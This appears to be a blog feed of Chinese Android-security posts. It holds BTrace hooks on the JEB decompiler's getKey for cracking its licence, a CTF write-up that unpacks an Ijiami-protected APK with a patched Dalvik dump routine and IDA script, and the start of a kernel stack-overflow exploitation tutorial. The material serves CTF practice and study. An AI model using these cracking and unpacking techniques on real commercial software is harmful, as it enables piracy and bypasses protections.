com.sun.btrace.BTraceUtils.*;  </div><div class="line">/*  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.Wr&quot;, </div><div class="line">    method = &quot;saveProject&quot;)  </div><div class="line">   public static void traceExecute()&#123;  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.qI&quot;, </div><div class="line">    method = &quot;getKey&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.qI object, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, </div><div class="line">    method = &quot;dL&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.GN object, byte[] var0, int var1, int var2, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb </tag>
            
            <tag> 破解 </tag>
            
            <tag> jar包调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【天翼杯安卓题二】 爱加密脱壳实战]]></title>
      <url>/2017/10/22/aijiami_unpacker.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  这个apk使用爱加密加密，加密时间是2017.6月。这个题其实就是个脱壳题，脱完立马见flag。(出题人也太懒了)</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/app02.apk" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/app02.apk</a></p>
<h3 id="壳介绍"><a href="#壳介绍" class="headerlink" title="壳介绍"></a>壳介绍</h3><p>爱加密的壳16年年底就已经开始通过 <code>hook dvmResolveClass</code> ，在调用具体方法时解密方法指令，然后将 DexFile结构体中的对应方法的 <code>md-&gt;insns</code> 指向 解密后的方法指令数据区，然后进入 <code>真正的dvmResolveClass</code>中执行指令，执行完后在重新加密指令，这样就可以防止 <code>dexhunter</code> 等工具在内存中 <code>dump dex</code> 文件。</p>
<p>流程图</p>
<p><img src="/img/android_sec/ijiami_flow.png" alt="流程图"></p>
<p><a href="http://www.cnblogs.com/2014asm/p/6534189.html" target="_blank" rel="external">图片来源</a> </p>
<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>由上面可以知道，在<code>dvmResolveClass</code>函数执行的时候，代码是已经还原好了的。这时我们去<code>dump</code>相应的指令就是正确的指令。于是修改 <code>dvmResolveClass</code> 的代码，<code>dump</code> 方法的数据。<br>修改 <code>dvmResolveClass</code> 函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*  add dump .....*/   </div><div class="line">    </div><div class="line">  char key_str[20] = &quot;jiajiatest&quot;;</div><div class="line">  int fd=open(&quot;/data/local/tmp/resolve_class_config&quot;,O_RDONLY,0666);</div><div class="line">  if(fd!=-1)&#123;</div><div class="line">    int len = read(fd,key_str,19);</div><div class="line">    key_str[len-1] = &apos;\x00&apos;;</div><div class="line">    key_str[len] = &apos;\x00&apos;;</div><div class="line">    close(fd);</div><div class="line">  &#125;</div><div class="line">  ALOGI(&quot;The key_str ---&gt; %s----referrer-&gt;descriptor---&gt;%s--&quot;, key_str, referrer-&gt;descriptor);</div><div class="line">  </div><div class="line">if(strstr(referrer-&gt;descriptor, key_str))&#123;</div><div class="line">       char task_name[] = &quot;task_name&quot;;</div><div class="line">      char *logbuf = new char[1024];</div><div class="line">      char path[50] = &#123;0&#125;;</div><div class="line">      sprintf(path, &quot;/data/local/tmp/%s_dump_%d&quot;, key_str, getpid());</div><div class="line">      FILE *fpw = fopen(path, &quot;awb+&quot;);</div><div class="line">      for(int i=0; i &lt; referrer-&gt;directMethodCount; i++)&#123;</div><div class="line">        Method* md = &amp;referrer-&gt;directMethods[i];</div><div class="line">        const char* mName_d = md-&gt;name;</div><div class="line">        const u2 insSize_d = md-&gt;insSize;</div><div class="line">        const u2* insns_d = md-&gt;insns;</div><div class="line">        const u2 methodldx_d = md-&gt;methodIndex;</div><div class="line">        u4 insns_d_size = dvmGetMethodInsnsSize(md);</div><div class="line">// ALOGI(&quot;hacklh_md----&gt;%p, i--&gt;%d, directMethodCount--&gt;%d&quot;, md, i,referrer-&gt;directMethodCount);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_d,methodldx_d,insSize_d,(u4)insns_d, insns_d_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123; </div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_d,1,insns_d_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;——(KL)open %s fail!&quot;, path);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      for(int i=0; i &lt; referrer-&gt;virtualMethodCount; i++)&#123;</div><div class="line">        Method* mv = &amp;referrer-&gt;virtualMethods[i];</div><div class="line">        const char* mName_v = mv-&gt;name;</div><div class="line">        const u2 insSize_v = mv-&gt;insSize;</div><div class="line">        const u2* insns_v = mv-&gt;insns;</div><div class="line">        const u2 methodIdx_v = mv-&gt;methodIndex;</div><div class="line">        u4 insns_v_size = dvmGetMethodInsnsSize(mv);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_v,methodIdx_v,insSize_v,(u4)insns_v, insns_v_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123;</div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_v,1,insns_v_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;%s&quot;,&quot;——(KL)open file fail!&quot;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      if(fpw != NULL)&#123;</div><div class="line">        fclose(fpw);</div><div class="line">      &#125;</div><div class="line">      delete logbuf;</div><div class="line">/*  add end .....*/</div></pre></td></tr></table></figure>
<p>dump之后我们需要把指令patch到dex对应位置上去，patch的方式有很多种，我选择使用ida脚本对他进行patch。我觉得ida就是一个各种文件格式的loader，我们可以在ida中修改文件的内容，然后可以让ida把修改应用到文件中，以完成patch。 因此在IDA中patch代码十分的方便，而且也很方便的查看patch后的结果。patch代码的流程是： </p>
<hr>
<p>读取dump的方法指令—&gt;定位相应方法指令数据区在ida中的位置—-&gt;patch</p>
<hr>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/python</div><div class="line"># -*- coding: utf8 -*-</div><div class="line"></div><div class="line"># 该脚本用于在ida中使用dump下来的method指令对 dex 进行Patch</div><div class="line">import re</div><div class="line">from dex_parser import dex</div><div class="line"></div><div class="line">#存储 存放dump数据的字典</div><div class="line">data_array = []</div><div class="line">#用来避免多次patch</div><div class="line">patched = []</div><div class="line">file_data = &quot;&quot;</div><div class="line"></div><div class="line">def parse_meta_data(data=&quot;&quot;):</div><div class="line">    # print data</div><div class="line">    ret = &#123;&#125;</div><div class="line">    tokens = re.findall(&quot;\[class=(.*?),.*?method=(.*?),.*?codeSize=(.*?)\]&quot;,data)</div><div class="line">    # print tokens</div><div class="line"></div><div class="line">    ret[&apos;class_name&apos;] = tokens[0][0][1:].replace(&apos;/&apos;,&apos;.&apos;).replace(&apos;;&apos;,&apos;&apos;)</div><div class="line">    ret[&apos;method&apos;] = tokens[0][1]</div><div class="line">    ret[&apos;code_size&apos;] = int(tokens[0][2]) * 2 #dex文件格式定义，总大小为 codeSize*2</div><div class="line">    # print ret</div><div class="line">    return ret</div><div class="line"></div><div class="line">#注释，用于给ida执行</div><div class="line"># def patch_byte(a, b):</div><div class="line">#     print hex(b),</div><div class="line"></div><div class="line">def patch(dest, src, size):</div><div class="line">    print &quot;dest::&#123;&#125;, src::&#123;&#125;, size::&#123;&#125;&quot;.format(dest, src, size)</div><div class="line">    for i in range(size):</div><div class="line">        patch_byte(dest + i, int(file_data[ src + i].encode(&apos;hex&apos;), 16))</div><div class="line"></div><div class="line">    print &quot;\n&quot;</div><div class="line"></div><div class="line">def parse_dump_data(filename):</div><div class="line">    global file_data</div><div class="line">    with open(filename, &quot;rb&quot;) as fp:</div><div class="line">        file_data = fp.read()</div><div class="line"></div><div class="line">    #使用正则表达式把说明dump数据的元数据加载到内存</div><div class="line">    all_item = re.findall(&quot;-------------- \(KL\)resolving(.*?) in pid:.*?\(name: task_name\)&quot;, file_data)</div><div class="line">    offset = 0</div><div class="line">    for meta_data in all_item:</div><div class="line">        try:</div><div class="line">            #使用字典组织数据</div><div class="line">            #&#123;&apos;class_name&apos;: &apos;com.example.jiajiatest.MainActivity&apos;, &apos;code_size&apos;: 306, &apos;method&apos;: &apos;add&apos;, &apos;data_offset&apos;: 7175&#125;</div><div class="line"></div><div class="line">            ret = parse_meta_data(meta_data)</div><div class="line">            data_addr = file_data.find(&apos;(name: task_name)&apos;, offset) + 17</div><div class="line">            ret[&apos;data_offset&apos;] = data_addr</div><div class="line">            data_array.append(ret)</div><div class="line">            offset = data_addr</div><div class="line">        except Exception as e:</div><div class="line">            raise e</div><div class="line"></div><div class="line">    return data_array</div><div class="line"></div><div class="line">def get_method_addr(method_data, signature_str):</div><div class="line">    for md_name in method_data:</div><div class="line">        if signature_str in md_name:</div><div class="line">            return method_data[md_name]</div><div class="line">    return -1</div><div class="line"></div><div class="line">def patch_dex(dump_data_file, dex_file):</div><div class="line">    dump_data = parse_dump_data(dump_data_file)</div><div class="line">    dex_obj = dex.dex_parser(dex_file)</div><div class="line">    method_data = dex_obj.get_class_data()</div><div class="line"></div><div class="line">    for item in dump_data:</div><div class="line">        signature_str = &quot;&#123;&#125;::&#123;&#125;&quot;.format(item[&apos;class_name&apos;], item[&apos;method&apos;])</div><div class="line">        if  signature_str not in patched:</div><div class="line"></div><div class="line">            #获取要patch的目标地址</div><div class="line">            addr = get_method_addr(method_data, signature_str)</div><div class="line">            if addr == -1:</div><div class="line">                print &quot;&#123;&#125; can&apos;t get insns addr&quot;.format(signature_str)</div><div class="line">                continue</div><div class="line">            #do patch</div><div class="line">            print &quot;patch &quot; + signature_str,</div><div class="line">            patch(addr,item[&apos;data_offset&apos;],item[&apos;code_size&apos;])</div><div class="line">            patched.append(signature_str)</div><div class="line"></div><div class="line">    # print patched</div><div class="line">    # for i in patched:</div><div class="line">    #     print i</div><div class="line"></div><div class="line">import pprint</div><div class="line"></div><div class="line">patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    print &quot;comming main&quot;</div><div class="line">    # parse_dump_data(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;)</div><div class="line">    # patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">    # dex_obj = dex.dex_parser(&quot;F:\code_workplace\ida_script\classes.dex&quot;)</div><div class="line">    # class_data = dex_obj.get_class_data()</div><div class="line">    # pprint.pprint(class_data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    # parse_meta_data(&quot;-------------- (KL)resolving [class=Lcom/example/jiajiatest/HttpRunner;, method=makeImgHttpGET, methodIndex=13, insSize=2, insns_d=6daf04d8, codeSize=270] in pid: 20406(name: task_name)&quot;)</div></pre></td></tr></table></figure>
<p>patch前后对比：</p>
<p>patch前</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763745193jfvdw2et.png?imageslim" alt="raw"><br>patch后</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763780531bdpdup3e.png?imageslim" alt="paste image"></p>
<p>这时已经可以看到程序的主体逻辑了。然后查看字符串就可以拿到flag………</p>
<h3 id="我干的傻事"><a href="#我干的傻事" class="headerlink" title="我干的傻事"></a>我干的傻事</h3><ul>
<li><p>代码循环条件忘记写了，导致越界，一打开应用就报错。 </p>
</li>
<li><p>文件打开失败，貌似是权限问题，我直接暴力把 <code>/data/local/tmp</code> 改成 777</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 分析安卓底层代码的错误，要关注 <code>logcat</code> 日志，找到出问题的代码点，然后把库的带符号版本放到ida中分析<br>分析bug, 要看代码的关键逻辑， 判断条件等。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>要多实践，如有问题请在下面评论。</p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓脱壳 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Android内核漏洞利用技术实战：环境搭建&栈溢出实战]]></title>
      <url>/2017/08/14/android_kernel_explit_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Android</code>的内核采用的是 <code>Linux</code> 内核，所以在<code>Android</code>内核中进行漏洞利用其实和在 一般的 x86平台下的 <code>linux</code> 内核中进行利用差不多。主要区别在于 <code>Android</code> 下使用的是<code>arm</code>汇编以及环境的搭建方面。本文对我最近的实践做一个分享，其实很简单。</p>
<h3 id="内核调试环境搭建"><a href="#内核调试环境搭建" class="headerlink" title="内核调试环境搭建"></a>内核调试环境搭建</h3><p>搭建平台:    <code>ubuntu 16.04</code></p>
<p>这里使用 <code>android</code> 模拟器来进行内核调试。首先下载内核代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git</div></pre></td></tr></table></figure>
<p>然后下载 <code>github</code> 上的一个安卓漏洞利用的项目，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges</div></pre></td></tr></table></figure></p>
<p>然后使用项目中的 <code>patch</code> 文件把 <code>patch</code> 内核编译配置，来把项目中的带漏洞的模块编译进 <code>linux</code> 内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch &amp;&amp; \</div><div class="line">cd .. &amp;&amp; ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</div></pre></td></tr></table></figure></p>
<p>这里注意： <code>goldfish</code> 目录和  <code>kernel_exploit_challenges</code> 目录要在同一目录下</p>
<p>然后下载 <code>arm-linux-androideabi-4.6</code> 交叉编译工具链 。下载完成后把它解压后，然后把它加到环境变量中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">tar xvf arm-linux-androideabi-4.6.tar.bz2 </div><div class="line">export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH</div></pre></td></tr></table></figure>
<p>然后进入 <code>goldfish</code> 目录，开始编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">make goldfish_armv7_defconfig &amp;&amp; make -j8</div></pre></td></tr></table></figure></p>
<p>编译完成后，就会有两个主要的文件：<code>goldfish/vmlinux</code> 和 <code>goldfish/arch/arm/boot/zImage</code>。前面那个用于在调试时 <code>gdb</code> 加载，后面的用于在安卓模拟器启动时加载。</p>
<p>下面下载 安卓 <code>sdk</code> , 用来下载和运行 安卓模拟器。</p>
<p><code>sdk</code> 下载地址： <code>http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</code></p>
<p>然后把<code>sdk</code> 解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">tar xvf android-sdk_r24.4.1-linux.tgz</div></pre></td></tr></table></figure></p>
<p>把 android-sdk-linux/tools  加入环境变量，把下面的命令添加到 ~/.bashrc 的末尾&lt;把命令中的目录改成你的目录&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PATH=/home/haclh/hacktools/android-sdk-linux/tools:$PATH</div></pre></td></tr></table></figure></p>
<p>然后重新打开一个shell, 使用下面的命令 &lt;要先下载jdk ,并且设置好环境变量&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">android</div></pre></td></tr></table></figure></p>
<p>然后把下面标注的两个下载下来</p>
<p>来<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512056420990rincxky6.png?imageslim" alt="paste image"><br>下载完后。首先查看下载的镜像文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">$android list targets</div><div class="line">Available Android targets:</div><div class="line">----------</div><div class="line">id: 1 or &quot;android-19&quot;</div><div class="line">     Name: Android 4.4.2</div><div class="line">     Type: Platform</div><div class="line">     API level: 19</div><div class="line">     Revision: 4</div><div class="line">     Skins: HVGA, QVGA, WQVGA400, WQVGA432, WSVGA, WVGA800 (default), WVGA854, WXGA720, WXGA800, WXGA800-7in</div></pre></td></tr></table></figure>
<p>然后创建 模拟器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">android create avd --force -t &quot;android-19&quot; -n kernel_challenges</div></pre></td></tr></table></figure></p>
<p>然后进入 goldfish 目录，使用下面的命令来使用我们的内核来运行模拟器，并在 1234 端口起一个 gdbserver 来方便进行 内核调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</div></pre></td></tr></table></figure></p>
<p>第一次运行有类似的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">$ emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</div><div class="line">WARNING: userdata image already in use, changes will not persist!</div><div class="line">Creating filesystem with parameters:</div><div class="line">    Size: 576716800</div><div class="line">    Block size: 4096</div><div class="line">    Blocks per group: 32768</div><div class="line">    Inodes per group: 7040</div><div class="line">    Inode size: 256</div><div class="line">    Journal blocks: 2200</div><div class="line">    Label: </div><div class="line">    Blocks: 140800</div><div class="line">    Block groups: 5</div><div class="line">    Reserved block group size: 39</div><div class="line">Created filesystem with 11/35200 inodes and 4536/140800 blocks</div><div class="line">WARNING: cache image already in use, changes will not persist!</div><div class="line">Creating filesystem with parameters:</div><div class="line">    Size: 69206016</div><div class="line">    Block size: 4096</div><div class="line">    Blocks per group: 32768</div><div class="line">    Inodes per group: 4224</div><div class="line">    Inode size: 256</div><div class="line">    Journal blocks: 1024</div><div class="line">    Label: </div><div class="line">    Blocks: 16896</div><div class="line">    Block groups: 1</div><div class="line">    Reserved block group size: 7</div><div class="line">Created filesystem with 11/4224 inodes and 1302/16896 blocks</div><div class="line">......................</div><div class="line">......................</div><div class="line">......................</div></pre></td></tr></table></figure></p>
<p>为了便于后面的操作我们需要把 交叉编译工具链 添加到环境变量里。把下面的命令添加到 ~/.bashrc 的末尾&lt;把命令中的目录改成你的目录&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export</div><div class="line">PATH=/home/haclh/hacktools/arm-linux-androideabi-4.6/bin/:$PATH</div></pre></td></tr></table></figure></p>
<p>然后重新开个 shell, 进入到 goldfish 目录，加载 vmlinux 以便调试内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arm-linux-androideabi-gdb vmlinux</div></pre></td></tr></table></figure></p>
<p>如果一切正常，应该可以得到下面的类似输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GNU gdb (GDB) 7.3.1-gg2</div><div class="line">Copyright (C) 2011 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;--host=x86_64-apple-darwin --target=arm-linux-android&quot;.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</div><div class="line">Reading symbols from &lt;REDACTED&gt;/goldfish/vmlinux...done.</div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
<p>然后连接 模拟器里面的 调试端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">(gdb) target remote :1234</div><div class="line">Remote debugging using :1234</div><div class="line">cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74</div><div class="line">74movpc, lr</div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
<p>如果能看到这样的输出说明已经可以正常进行内核调试了。</p>
<p>内核栈溢出漏洞利用     </p>
<p>首先看看漏洞代码， <code>kernel_exploit_challenges/challenges/stack_buffer_overflow/module/stack_buffer_overflow.c</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#include &lt;linux/module.h&gt;</div><div class="line">#include &lt;linux/kernel.h&gt;</div><div class="line">#include &lt;linux/init.h&gt;</div><div class="line">#include &lt;linux/proc_fs.h&gt;</div><div class="line">#include &lt;linux/string.h&gt;</div><div class="line">#include &lt;asm/uaccess.h&gt;</div><div class="line">#define MAX_LENGTH 64</div><div class="line">MODULE_LICENSE(&quot;GPL&quot;);</div><div class="line">MODULE_AUTHOR(&quot;Ryan Welton&quot;);</div><div class="line">MODULE_DESCRIPTION(&quot;Stack Buffer Overflow Example&quot;);</div><div class="line">static struct proc_dir_entry *stack_buffer_proc_entry;</div><div class="line">int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)</div><div class="line">&#123;</div><div class="line">    char buf[MAX_LENGTH];</div><div class="line">    if (copy_from_user(&amp;buf, ubuf, count)) &#123;</div><div class="line">        printk(KERN_INFO &quot;stackBufferProcEntry: error copying data from userspace\n&quot;);</div><div class="line">        return -EFAULT;</div><div class="line">    &#125;</div><div class="line">    return count;</div><div class="line">&#125;</div><div class="line">static int __init stack_buffer_proc_init(void)</div><div class="line">&#123;</div><div class="line">    stack_buffer_proc_entry = create_proc_entry(&quot;stack_buffer_overflow&quot;, 0666, NULL);</div><div class="line">    